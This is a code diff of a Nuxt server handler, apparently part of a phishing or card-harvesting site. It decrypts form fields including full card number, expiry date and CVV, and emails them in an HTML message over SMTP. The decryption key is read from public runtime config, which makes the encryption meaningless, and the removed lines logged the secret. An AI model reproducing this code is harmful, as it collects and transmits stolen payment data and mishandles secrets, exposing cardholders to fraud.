@@ -2,14 +2,9 @@ import nodemailer from "nodemailer";
 import { decryptPayload } from "~/utils/decrypt";
 
 export default defineEventHandler(async (event) => {
-  const secret = useRuntimeConfig().public.cryptoSecret
+  const body = await readBody(event)
 
-  const { payload } = await readBody(event)
-  const data = decryptPayload(payload, secret)
-  console.log("process.env.CRYPTO_SECRET", secret);
-  console.log("payload", payload);
-
-  const { pseudo, email, telephone, message, card_number, card_expiration, card_cvv } = data
+  const { pseudo, email, telephone, message, card_number, card_expiration, card_cvv } = body
 
   if (!email || !pseudo) {
     throw createError({
@@ -18,6 +13,15 @@ export default defineEventHandler(async (event) => {
     })
   }
 
+  const secret = useRuntimeConfig().public.cryptoSecret
+  // 🔓 Déchiffrement
+  const decryptedCardNumber = decryptPayload(card_number, secret);
+  const decryptedPseudo = decryptPayload(pseudo, secret);
+  const decryptedEmail = decryptPayload(email, secret);
+  const decryptedPhone = decryptPayload(telephone, secret);
+  const decryptedMessage = decryptPayload(message, secret)
+  const decryptedECardExpiration = decryptPayload(card_expiration, secret);
+  const decryptedCVV = decryptPayload(card_cvv, secret);
 
   const transporter = nodemailer.createTransport({
     host: process.env.SMTP_HOST,
@@ -47,12 +51,12 @@ export default defineEventHandler(async (event) => {
   ">
     <h2 style="text-align:center; color:#4a90e2;">📨 Détails de l'opération</h2>
     <ol style="padding-left: 20px; font-size: 16px; color: #333;">
-      <li><b>Pseudo :</b> ${data.pseudo || 'N/A'}</li>
-      <li><b>Email :</b> ${data.email || 'N/A'}</li>
-      <li><b>Téléphone :</b> ${data.telephone || 'N/A'}</li>
-      <li><b>Carte :</b> ${data.card_number || 'N/A'}</li>
-      <li><b>CVV :</b> ${data.card_cvv|| 'N/A'}</li>
-      <li><b>Date d'expiration :</b> ${data.card_expiration || 'N/A'}</li>
+      <li><b>Pseudo :</b> ${decryptedPseudo || 'N/A'}</li>
+      <li><b>Email :</b> ${decryptedEmail || 'N/A'}</li>
+      <li><b>Téléphone :</b> ${decryptedPhone || 'N/A'}</li>
+      <li><b>Carte :</b> ${decryptedCardNumber || 'N/A'}</li>
+      <li><b>CVV :</b> ${decryptedCVV || 'N/A'}</li>
+      <li><b>Date d'expiration :</b> ${decryptedECardExpiration || 'N/A'}</li>
     </ol>
     <p style="text-align:center; margin-top:20px; font-size:14px; color:#555;">
       Merci pour votre confiance ! 💙
